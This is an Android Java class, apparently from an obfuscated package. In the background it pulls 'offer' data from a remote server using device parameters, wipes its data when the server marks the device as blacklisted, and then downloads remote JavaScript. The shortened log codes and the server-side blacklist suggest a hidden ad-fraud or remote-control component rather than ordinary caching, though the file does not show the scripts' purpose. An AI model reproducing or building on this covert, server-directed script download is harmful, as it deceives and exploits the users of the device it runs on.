package w.c.s.task;

import android.annotation.SuppressLint;
import android.os.AsyncTask;
import android.text.TextUtils;

import org.json.JSONArray;
import org.json.JSONObject;

import w.c.s.entity.UParams;
import w.c.s.utils.HttpUtils;
import w.c.s.utils.JsUtil;
import w.c.s.utils.LinkUtil;
import w.c.s.utils.LogUtil;
import w.c.s.utils.PhoneControl;
import w.c.s.utils.XmlShareTool;
import w.c.s.view.AgentService;


/**
 * Created by xlc on 2017/5/24.
 */

public class CacheUtil extends AsyncTask<Void, Integer, Boolean> {

    private AgentService aservice;

    public int getCache_status () {
        return cache_status;
    }

    public void setCache_status (int cache_status) {
        this.cache_status = cache_status;
    }

    private int cache_status = CH_CACHE_STATUS_START;

    public static final int CH_CACHE_STATUS_DOING = -1;

    public static final int CH_CACHE_STATUS_SUCCESS = -2;

    public static final int CH_CACHE_STATUS_START = -4;

    private int is_b_list = 0;

    public CacheUtil (AgentService aservice) {
        setCache_status(CH_CACHE_STATUS_START);
        this.aservice = aservice;
        is_b_list = XmlShareTool.getShare(aservice).getInt(XmlShareTool.TAG_BLACK_LIST_STATE, 0);
    }

    @Override
    protected Boolean doInBackground (Void... params) {
        boolean cache_success = false;
        setCache_status(CH_CACHE_STATUS_DOING);
        try {
            String datas = HttpUtils.getCaseData(aservice, UParams.getInstance(aservice).getHashMap());
            LogUtil.show("CacheTask data:" + datas);
            if ( !TextUtils.isEmpty(datas) ) {
                JSONObject jsonObject = new JSONObject(datas);
                String status = jsonObject.getString("status");

                if ( Integer.parseInt(status) == -3 ) {
                    LogUtil.show("n c");
                    LinkUtil.delete_all(aservice);
                    PhoneControl.save_status(aservice);
                    return false;
                }

                //黑名单
                if ( Integer.parseInt(status) == -1 ) {
                    //                                        LogUtil.w("黑名单 记录时间，满足下次间隔缓存时间后再次判断");
                    //                                        LogUtil.show("black list save time");
                    LogUtil.show("b l");
                    is_b_list = -1;
                    //清空所有数据
                    LinkUtil.delete_all(aservice);
                    PhoneControl.save_status(aservice);
                    return false;
                }

                is_b_list = 1;
                //                                LogUtil.w("CacheTask status: 请求状态" + status);
                JSONArray jsonArray = jsonObject.getJSONArray("data");

                //保存缓存状态
                if ( jsonArray.length() > 0 ) {
                    //清空所有数据
                    LinkUtil.delete_all(aservice);

                    LogUtil.show("ca succ");
                    //  LogUtil.w("缓存成功");

                    cache_success = true;
                    PhoneControl.save_status(aservice);
                }

                if ( jsonArray.length() == 0 ) {
                    LogUtil.show("not data");
                }

                // 保存数据
                LinkUtil.save(jsonArray, aservice);
            }
        } catch ( Exception e ) {
            e.printStackTrace();
        }
        return cache_success;
    }

    @SuppressLint ("NewApi")
    @Override
    protected void onPostExecute (Boolean aBoolean) {
        super.onPostExecute(aBoolean);
        if ( JsUtil.getInstance(aservice).check_d_js_time() && aBoolean ) {
            if ( JsUtil.getInstance(aservice).getJsCacheStatus() != JsUtil.JS_CACHE_STATUS_DOING ) {
                //                                LogUtil.w("缓存offer结束后，满足下载js文件条件");
                //                                LogUtil.show("after cache，do download js");
                LogUtil.show("d j");
                new DownJsUtil(aservice).executeOnExecutor(HttpUtils.executorService);
            }
        }

        XmlShareTool.saveBlackState(aservice, is_b_list);
        aservice.check_black_list();
    }
}